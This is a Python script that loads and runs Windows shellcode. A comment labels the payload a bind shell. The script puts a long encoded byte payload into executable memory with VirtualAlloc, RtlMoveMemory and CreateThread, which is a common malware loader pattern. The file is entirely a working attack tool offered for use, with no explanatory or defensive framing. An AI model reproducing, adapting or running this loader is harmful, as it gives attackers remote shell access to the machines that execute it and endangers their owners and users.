#! /usr/bin/env python
# encoding:utf-8

import ctypes

def execute():
    # Bind shell
    shellcode = bytearray(
    "\xda\xd8\xd9\x74\x24\xf4\xb8\xc5\x6b\x8f\xb4\x5d\x2b"
    "\xc9\xb1\x99\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2"
    "\x30\xd0\xe6\xab\xd8\x87\x23\x1c\xc5\xbc\xf7\x57\xaa"
    "\x17\x31\x26\xc7\x59\x9e\x5b\xe4\xc6\x32\xdf\x44\xe3"
    "\xb2\x8a\x71\xf0\x4d\x85\x09\xe4\x25\x82\xf7\xee\xdb"
    "\x87\xd0\xd9\x0b\x68\xc8\x41\xc4\x14\xff\x77\x40\x5a"
    "\x77\x22\x30\xcc\xf0\xcd\x63\x85\x1e\x71\x1a\x09\x83"
    "\x8c\x56\x91\xe8\x83\x8a\xf4\x71\x93\x30\xd7\x8e\x4c"
    "\x02\x5d\x67\xbc\x54\xad\xc1\xd1\xb9\x63\xea\x6b\xa9"
    "\x83\xb0\x4b\xc9\x30\x54\xa5\xbd\x8f\x3b\xdc\xe8\x38"
    "\xd7\xd6\xfe\x97\xf6\x8e\xfd\xcf\xd9\xd8\x0c\x7b\x47"
    "\xdf\x77\x1b\x58\x79\x94\x93\x85\x46\x52\xff\xf9\x8e"
    "\x8d\x75\xa7\xcd\x94\xeb\x16\x20\x07\x01\x1b\x80\xc6"
    "\x87\xa3\x76\x39\x68\x84\x5e\x30\xa9\xc3\x73\x2c\xc9"
    "\x51\x84\xc3\xb0\x72\xe9\xec\x11\x6b\x86\xe1\x41\x4d"
    "\x6a\xac\xfa\x11\x94\x6e\x53\x3a\x86\x5e\x60\x48\x48"
    "\x57\x74\xb4\x96\xcf\x87\x7a\x53\x3e\x21\x84\xfc\x31"
    "\x4c\xbb\x0f\x8a\x02\xbf\x19\x16\x6c\x5a\x09\xd8\xd1"
    "\xca\x68\xcc\xa4\x47\x64\x4d\x8a\x67\x05\x77\x9a\x51"
    "\x9a\x25\xb8\x48\x2f\x5d\xb4\x56\xd3\x80\x44\x7d\x06"
    "\x80\xce\x57\xa4\xdf\x75\xd9\x32\x1c\x3f\x1d\x72\x33"
    "\xdd\xbf\xe3\xab\x52\xdf\xaa\xa1\x7a\x19\x15\x78\x69"
    "\x6f\x1b\x94\xf2\x43\x63\x72\x3b\xec\xa8\x2d\x3a\xf3"
    "\x2b\x20\x53\xbe\x2d\x7e\xea\x10\xcd\xd3\xc2\x43\x90"
    "\x19\x1d\x23\x44\x5a\x9d\xe9\x76\x44\x7d\xbc\x5b\x72"
    "\x9e\x10\x40\xdf\x07\x76\x3f\x58\x7e\x9f\x37\x54\xa3"
    "\xd1\x34\x7b\xe6\x2b\x31\x7a\xb7\xd4\x54\xd8\x5e\x4d"
    "\xad\x44\xa2\x25\xd4\x48\x73\x0d\x32\x46\xad\x11\xcb"
    "\xf2\x10\x0b\x8b\x46\x9f\x81\x62\xa0\x07\x75\xe9\xda"
    "\xf5\x2f\x65\xc9\x06\x56\x95\x08\x92\x32\x72\xd8\x22"
    "\x6d\xee\xc3\x62\x51\x33\xa8\xb5\xd7\xbb\x9d\x23\x67"
    "\x90\x91\xa2\xe7\x7e\x90\x05\xef\x8d\xfe\x59\xdf\xca"
    "\x3d\x77\x02\x26\x6c\xb7\x0a\x51\x42\x66\x5e\x47\xe4"
    "\x09\xb5\x8f\xcc\xed\x4f\x5f\x36\x8a\x22\xa1\x39\x70"
    "\xca\xef\x68\xfd\xf3\xc8\x93\xa6\x05\xda\x4d\x52\xc8"
    "\x56\xb5\x3a\x55\x8b\x96\x79\x79\xc5\xc5\xd0\x43\x2e"
    "\x77\x78\xe1\x49\x39\xfe\x6d\x67\x5c\xb2\x05\xe2\xb4"
    "\x42\x44\x0a\x53\x17\xc2\x3d\xd9\x22\x56\x8e\x14\x5d"
    "\xe8\x6c\x7c\x44\x02\xd0\x4f\x59\xce\x54\xf8\x18\xbf"
    "\x94\x0e\x94\xda\x09\xa1\x74\x9c\x91\xa5\xda\x6c\xf6"
    "\x79\x59\x3b\xd2\x26\x73\x8d\x6e\x75\x32\x67\xf9\xf1"
    "\xcf\x55\x34\x74\x6f\xe1\x62\xb4\x6e\x2a\x48\xdc\xa1"
    "\xb1\x9f\x67\xe5\x63\xc1\x75\xc2\xf1\xb9\xd8\xe8\x08"
    "\xd0\xf7\x02\x9e\x46\xf2\x41\x1d\xa5\xe3\x21\xb5\xae"
    "\x32\xff\x94\xa8\x96\xbd\x0b\x97\x70\x9b\x21\xb7\x3e"
    "\x7d\x21\x23\x99\xd5\xc6\x9e\x45\xdf\xb4\x6f\xc6\x6e"
    "\x47\xee\x06\x41\xcc\x38\x36\x72\xff\x95\x95\x87\x2e"
    "\x46\x70\x98\x9f\xca\xa0\xdc\xee\x0f\x70\xef\x47\xfc"
    "\x7f\x54\x83\x4d\x40\x4e\x31\x73\xaa\xec\x68\x5c\xae"
    "\x40"
     )

    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40))

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
    buf,
    ctypes.c_int(len(shellcode)))

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0)))

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
    ctypes.c_int(-1))
if __name__ == "__main__":
    execute()